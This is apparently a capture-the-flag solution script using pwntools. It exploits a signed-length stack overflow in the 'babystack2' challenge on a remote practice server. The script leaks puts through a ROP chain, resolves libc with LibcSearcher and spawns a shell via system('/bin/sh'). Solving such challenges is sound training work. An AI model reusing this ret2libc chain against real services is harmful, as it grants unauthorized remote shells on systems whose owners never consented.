from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

p = remote("node4.buuoj.cn", 26794)

p.recvuntil("length of your name:\n")
p.sendline(b'-1')

p.recvuntil("u name?\n")

e = ELF("./bjdctf_2020_babystack2")
putsP = e.plt["puts"]
putsG = e.got["puts"]
mainFunc = 0x40073b
pop_rdi = 0x400893

payload1 = b'a'*(0x10 + 8) + p64(pop_rdi) + p64(putsG) +p64(putsP) + p64(mainFunc)
p.sendline(payload1)

putsA = u64(p.recvline()[:-1].ljust(8, b'\x00')) # [:-1]去除'\n'

libc = LibcSearcher("puts", putsA)
offset = putsA - libc.dump("puts")
systemA = offset + libc.dump("system")
binshA = offset + libc.dump("str_bin_sh")

payload2 = b'a'*(0x10 + 8) + p64(pop_rdi) + p64(binshA) +p64(systemA)

p.recvuntil("length of your name:\n")
p.sendline(b'-1')

p.recvuntil("u name?\n")
p.sendline(payload2)

p.interactive()
